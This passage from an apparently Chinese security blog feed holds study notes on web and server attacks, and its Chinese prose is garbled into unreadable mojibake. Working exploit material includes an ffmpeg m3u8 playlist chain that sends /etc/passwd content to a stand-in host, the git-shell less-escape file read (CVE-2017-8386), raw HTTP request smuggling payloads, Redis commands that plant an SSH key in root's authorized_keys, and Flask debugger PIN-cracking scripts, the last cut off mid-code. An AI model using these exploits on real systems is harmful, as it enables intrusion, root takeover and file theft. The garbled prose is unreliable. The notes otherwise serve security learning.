æ˜¯åœ¨ffmpegä¸­æœ‰concatå‡½æ•°å¯ä»¥å¯¹URIè¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬åªè¦å°†æ–‡ä»¶ä½œä¸ºhttpè¯·æ±‚çš„å‚æ•°å³å¯å¸¦å‡ºï¼Œä½†ç›´æ¥ä½¿ç”¨concatå¹¶ä¸ä¼šå¯¹æ–‡ä»¶è¯·æ±‚è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå°æŠ€å·§ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¸»m3u8è®¿é—®æ¬¡çº§m3u8æ¥ä½¿å¾—æ–‡ä»¶è¢«è¯»å–</p><p>kkk.txt</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http:&#x2F;&#x2F;xxx&#x2F;test.txt|file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>text.txt</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http:&#x2F;&#x2F;xxx&#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xxx.m3u8</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http:&#x2F;&#x2F;xxx&#x2F;kkk.txt#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†kkk.txtå’Œtext.txtéƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åç”¨ffmpegå¤„ç†xxx.m3u8æ–‡ä»¶å³å¯å¸¦å‡ºpasswdæ–‡ä»¶é¦–è¡Œ</p><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="CVE-2017-8386"><a href="#CVE-2017-8386" class="headerlink" title="CVE-2017-8386"></a>CVE-2017-8386</h3><p>æ¼æ´æˆå› ï¼š</p><ul><li><p>å½“æˆ‘ä»¬æƒ³ä»githubå…‹éš†ä¸€ä»½ä»£ç ä¸‹æ¥çš„æ—¶å€™ï¼Œä¼šæœ‰sshå…‹éš†çš„é€‰é¡¹ï¼Œæˆ‘ä»¬å»éšä¾¿æä¸€ä¸ªåœ°å€ï¼Œæ‰¾åˆ°Clone with SSHé‡Œåˆ—å‡ºçš„åœ°å€ï¼š<code>git@github.com:Jlan45/j1an.github.io.git</code>å…¶å®å°±æ˜¯é€šè¿‡sshåè®®è¿æ¥githubä½¿ç”¨gitç”¨æˆ·å°†è¿™ä¸ªæ–‡ä»¶æä¸‹æ¥</p></li><li><p>é‚£æˆ‘ä»¬çŒœæƒ³ä¸€ä¸‹ï¼Œæ˜¯ä¸æ˜¯ç›´æ¥sshé“¾æ¥å°±èƒ½å’Œæˆ‘ä»¬é“¾æ¥ä¸€ä¸ªæœåŠ¡å™¨ä¸€æ ·å»æ‰§è¡Œå‘½ä»¤å‘¢</p></li><li><p>æµ‹è¯•å‘ç°æˆ‘ä»¬ç¡®å®è¿æ¥ä¸Šäº†æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨ç»™æˆ‘ä»¬å¼¹äº†ä¸€å¥è¯å°±è®©æˆ‘ä»¬å¼ºåˆ¶é€€å‡ºäº†</p></li><li><p>è¿™æ˜¯æ€ä¹ˆåšåˆ°çš„å’§</p></li><li><blockquote><p>é‚£ä¹ˆï¼Œgithubè¿™ç±»gitæœåŠ¡å•†æ˜¯æ€ä¹ˆå®ç°ä¸Šè¿°â€œå®‰å…¨â€é€šä¿¡çš„æµç¨‹çš„å‘¢ï¼Ÿ</p><p>è®©ç”¨æˆ·å¯ä»¥é€šè¿‡sshè®¤è¯èº«ä»½ï¼Œä½†åˆä¸ç»™ç”¨æˆ·shellï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ä¸¤ç§æ–¹æ³•å®ç°ï¼š</p><p>åˆ›å»ºç³»ç»Ÿç”¨æˆ·gitçš„æ—¶å€™å°†å…¶shellè®¾ç½®æˆgit-shell<br>åœ¨authorized_keysæ–‡ä»¶æ¯ä¸ªssh-keyçš„å‰é¢è®¾ç½®commandï¼Œè¦†ç›–æˆ–åŠ«æŒé‡å†™åŸæœ¬çš„å‘½ä»¤<br>ç¬¬ä¸€ç§æ–¹æ³•æ¯”è¾ƒç›´è§‚ï¼Œå°±æ˜¯åˆ›å»ºç”¨æˆ·çš„æ—¶å€™ä¸ç»™å…¶æ­£å¸¸çš„bashæˆ–shçš„shellï¼Œè€Œæ˜¯ç»™å®ƒä¸€ä¸ªgit-shellã€‚git-shellæ˜¯ä¸€ä¸ªæ²™ç›’ç¯å¢ƒï¼Œåœ¨git-shellä¸‹ï¼Œåªå…è®¸æ‰§è¡Œæ²™ç›’å†…åŒ…å«çš„å‘½ä»¤ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œå»ºç“¯æœ€åã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/JiangBuLiu/article/details/95065034">https://blog.csdn.net/JiangBuLiu/article/details/95065034</a></p></blockquote></li><li><p>åœ¨githubä¸­ç¡®å®æ˜¯åªæœ‰è¿™ä¸‰æ¡å‘½ä»¤å¯ç”¨</p><ul><li><code>git-receive-pack &lt;argument&gt;</code></li><li><code>git-upload-pack &lt;argument&gt;</code></li><li><code>git-upload-archive &lt;argument&gt;</code></li></ul></li><li><p>ä½†æ˜¯åé¢æœ‰äº†å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€“helpæ¥æ‰“å¼€ä¸€ä¸ªmané¡µé¢ï¼Œå¹¶ä¸”å…¶ä¼šè‡ªåŠ¨è°ƒç”¨lesså‘½ä»¤ï¼Œè€Œé€šè¿‡lesså‘½ä»¤æˆ‘ä»¬å°±èƒ½ç›´æ¥é€šè¿‡<code>shift+e</code>é”®æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”šè‡³å¯ä»¥é€šè¿‡<code>!å‘½ä»¤</code>æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p></li></ul><p>æ¼æ´å†…å®¹ï¼šé€šè¿‡githubçš„SSHå®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p>æ¼æ´å¤ç°ï¼š</p><ol><li><p>é¦–å…ˆè¿˜æ˜¯vulhubå¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰id_rsaç§é’¥æ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡è¿™ä¸ªç§é’¥æ¥è¿æ¥dockerï¼Œå¹¶ä¸”æ‰§è¡Œ<code>git-upload-archive &#39;--help&#39;</code>å‘½ä»¤</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010033494.png"></p><p>å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸè¿›å…¥äº†mané¡µé¢</p></li><li><p>å°è¯•è¯»å–/etc/passwd<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010034597.png"></p><p>è¯»å–æˆåŠŸ</p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç ´ç ´çƒ‚çƒ‚ç¢ç¢çŸ¥è¯†æ±‡æ€»</title>
      <link href="/posts/ad1540aa.html"/>
      <url>/posts/ad1540aa.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPéƒ¨åˆ†è¯·æ±‚å¤´"><a href="#HTTPéƒ¨åˆ†è¯·æ±‚å¤´" class="headerlink" title="HTTPéƒ¨åˆ†è¯·æ±‚å¤´"></a>HTTPéƒ¨åˆ†è¯·æ±‚å¤´</h2><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>å…¶ä¸­ä¸­æœ‰ä¸€ç±»ç‰¹å®šç¼–ç :chunkedç¼–ç .è¯¥ç¼–ç å°†å®ä½“åˆ†å—ä¼ é€å¹¶é€å—æ ‡æ˜é•¿åº¦,ç›´åˆ°é•¿åº¦ä¸º0å—è¡¨ç¤ºä¼ è¾“ç»“æŸ, è¿™åœ¨å®ä½“é•¿åº¦æœªçŸ¥æ—¶ç‰¹åˆ«æœ‰ç”¨(æ¯”å¦‚ç”±æ•°æ®åº“åŠ¨æ€äº§ç”Ÿçš„æ•°æ®)ï¼Œè¯¥ç¼–ç æ ¼å¼ä¸º</p><pre class="line-numbers language-none"><code class="language-none">Transfer-Encoding: chunked\r\n\r\n16è¿›åˆ¶è¡¨ç¤ºä¸‹ä¸€ä¸ªåˆ†å—çš„é•¿åº¦\r\nè¦å‘é€çš„æ•°æ®\r\né‡å¤ä¸Šåˆ—æ•°æ®ç›´åˆ°æœ€ç»ˆç»“å°¾ä½¿ç”¨ä¸€ä¸ªç©ºçš„æ•°æ®å—æ¥è¡¨ç¤ºå†…å®¹ç»“æŸ0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><p>æ¡ä»¶ï¼š/proc/æŸè¿›ç¨‹pid/memå¯è¯»</p><h2 id="HTTPè¯·æ±‚èµ°ç§"><a href="#HTTPè¯·æ±‚èµ°ç§" class="headerlink" title="HTTPè¯·æ±‚èµ°ç§"></a>HTTPè¯·æ±‚èµ°ç§</h2><h3 id="æˆå› "><a href="#æˆå› " class="headerlink" title="æˆå› "></a>æˆå› </h3><p>è¯·æ±‚èµ°ç§å¤§å¤šå‘ç”Ÿäºå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´çš„æƒ…å†µã€‚è¿™æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼Œå³ <code>Content-Length</code> å’Œ <code>Transfer-Encoding</code> æ ‡å¤´ã€‚</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><ul><li>CLTEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ <code>Content-Length</code> å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ <code>Transfer-Encoding</code> å¤´</li><li>TECLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ <code>Transfer-Encoding</code> æ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ <code>Content-Length</code> æ ‡å¤´ã€‚</li><li>TETEï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ <code>Transfer-Encoding</code> æ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚</li></ul><h3 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h3><ol><li><p>CLä¸ä¸º0çš„GETè¯·æ±‚</p><p>å½“å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„ <code>Content-Length</code> å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">44\r\n</span></span><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/secret</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ—¶å‰ç«¯å¯¹ <code>Content-Length</code> å¤´è¿›è¡Œäº†å¤„ç†ï¼Œå°†åç»­ä¼ªé€ çš„GETè¯·æ±‚ä¼ å…¥äº†åç«¯ï¼Œè€Œåç«¯åˆ™æ²¡æœ‰å¤„ç†ï¼Œç›´æ¥å°†ä¸‹é¢çš„å†…å®¹å½“åšäº†åˆä¸€ä¸ªç‹¬ç«‹è¯·æ±‚è¿›è¡Œå¤„ç†</p></li><li><p>åŒCLå€¼ä¸åŒçš„è¯·æ±‚</p><p>æ ¹æ®RFC 7230ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª <code>Content-Length</code> ï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ï¼Œä½†æ˜¯æœ‰çš„æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸¥æ ¼å®ç°è¿™ä¸ªè§„èŒƒã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‰åç«¯å„å–ä¸åŒçš„ <code>Content-Length</code> å€¼æ—¶ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">7\r\n</span></span>12345\r\na<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªä¾‹å­ä¸­çš„aå°±ä¼šè¢«å¸¦å…¥åˆ°ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸­ï¼Œä½¿å¾—ä¸‹ä¸€ä¸ªè¯·æ±‚å˜æˆäº†</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">aGET / HTTP/1.1\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>CL-TE</p><p>æŒ‡å‰ç«¯æœåŠ¡å™¨å¤„ç† <code>Content-Length</code> è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰ <code>Content-Length</code> ï¼Œå¤„ç† <code>Transfer-Encoding</code> ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span>\r\n12\r\naPOST / HTTP/1.1\r\n\r\n0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å‰ç«¯åªå¤„ç†äº† <code>Content-Length</code> è¿™ä¸€è¯·æ±‚å¤´è€Œå¿½ç•¥äº† <code>Transfer-Encoding</code> è¯·æ±‚å¤´</p></li><li><p>TE-TE</p><p>æŒ‡å‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç† <code>Transfer-Encoding</code> è¯·æ±‚å¤´ï¼Œä½†æ˜¯åœ¨å®¹é”™æ€§ä¸Šè¡¨ç°ä¸åŒï¼Œä¾‹å¦‚æœ‰çš„æœåŠ¡å™¨å¯èƒ½ä¼šå¤„ç† <code>Transfer-encoding</code> ï¼Œæµ‹è¯•ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-encoding</span><span class="token punctuation">:</span> <span class="token header-value">cow\r\n</span></span>\r\n5c\r\naPOST / HTTP/1.1\r\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">15\r\n</span></span>\r\nx=1\r\n0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="PHP-sessionååºåˆ—åŒ–"><a href="#PHP-sessionååºåˆ—åŒ–" class="headerlink" title="PHP sessionååºåˆ—åŒ–"></a>PHP sessionååºåˆ—åŒ–</h2><h2 id="Redisæœªæˆæƒè®¿é—®"><a href="#Redisæœªæˆæƒè®¿é—®" class="headerlink" title="Redisæœªæˆæƒè®¿é—®"></a>Redisæœªæˆæƒè®¿é—®</h2><p>å…¶å®å¹¶ä¸æ˜¯CVEï¼Œä½†ä¹Ÿæ˜¯ä¸ªè›®æœ‰è¶£çš„æ¼æ´ï¼Œä¼—æ‰€å‘¨çŸ¥rediså’Œmemcachedè¿™ä¿©éš¾å…„éš¾å¼Ÿæ˜¯ä¸éœ€è¦å¯†ç çš„ï¼Œä½†æ˜¯ä»–ä»¬åŒæ—¶åˆæœ‰å¾ˆé«˜çš„æƒé™ï¼Œæ‰€ä»¥å½“è¿™ä¿©è´§å¯¹å¤–ç½‘å¼€å¯è®¿é—®æƒé™çš„æ—¶å€™å°±å¾ˆå®¹æ˜“è¢«æ‰«æåˆ°å¹¶ä¸”è¢«æï¼Œé‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œå¼€å¹²ï¼</p><p>åˆ©ç”¨æ¡ä»¶ï¼šRediså¼€æ”¾ç»™å¤–éƒ¨è®¿é—®å¹¶ä¸”çŸ¥é“sshé“¾æ¥ç«¯å£</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><ol><li>é¦–å…ˆæ­å»ºå¥½redisæœåŠ¡å¹¶æ›´æ”¹é…ç½®æ–‡ä»¶æ‰“å¼€å¤–éƒ¨è®¿é—®</li><li>åœ¨æœ¬æœºä¸­ä½¿ç”¨<code>ssh-keygen -t rsa</code>å‘½ä»¤æ¥è‡ªåŠ¨ç”Ÿæˆå…¬ç§é’¥</li><li>ä¸‹é¢å°±æ˜¯å°†å…¬é’¥å†™å…¥å—å®³æœºå™¨çš„<code>.ssh</code>ç›®å½•ä¸‹ï¼Œæ­¤å¤„æˆ‘ä»¬åˆ©ç”¨rediså¤‡ä»½æ•°æ®åº“æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œï¼Œé¦–å…ˆä½¿ç”¨rediså‘½ä»¤å°†å†…å®¹å†™å…¥åˆ°ä¸€ä¸ªæ•°æ®ä¸­<code>(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) | redis-cli -h å—å®³è€…IP -p redisç«¯å£ -x set crackit</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†å…¬é’¥å†™å…¥åˆ°äº†æ•°æ®åº“ä¸­</li><li>å†™å…¥åˆ°æ•°æ®åº“ä¸­è¿˜éœ€è¦å°†å…¬é’¥ä¿å­˜ä¸ºæ–‡ä»¶æ‰èƒ½ç”Ÿæ•ˆï¼Œæˆ‘ä»¬åˆ©ç”¨rediså‘½ä»¤æ¥å°†å…¬é’¥æ–‡ä»¶ä»¥æ•°æ®åº“å¤‡ä»½çš„å½¢å¼æ”¾å…¥<code>/root/.ssh/authorized_keys</code>ï¼Œä½¿ç”¨<code>config set dir /root/.ssh;config set dbfilename authorized_keys;save;</code>æ¥å°†æ•°æ®åº“æ–‡ä»¶ä¿å­˜</li><li>ä½¿ç”¨ç§é’¥ç›´æ¥è¿æ¥å—å®³è€…æœåŠ¡å™¨<code>ssh -i ~/.ssh/id_rsa root@å—å®³è€…IP -p SSHæœåŠ¡ç«¯å£</code></li></ol><h2 id="Flask-PINå€¼è®¡ç®—"><a href="#Flask-PINå€¼è®¡ç®—" class="headerlink" title="Flask PINå€¼è®¡ç®—"></a>Flask PINå€¼è®¡ç®—</h2><p>ç›´æ¥æ”¾è„šæœ¬ç®—äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5 python3.6</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span><span class="token comment"># flaskæ‰§è¡Œç”¨æˆ·</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),æŠ¥é”™ä¹Ÿå¯</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1 python3.8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># æŠ¥é”™å¾—åˆ°</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span>    <span class="token comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> 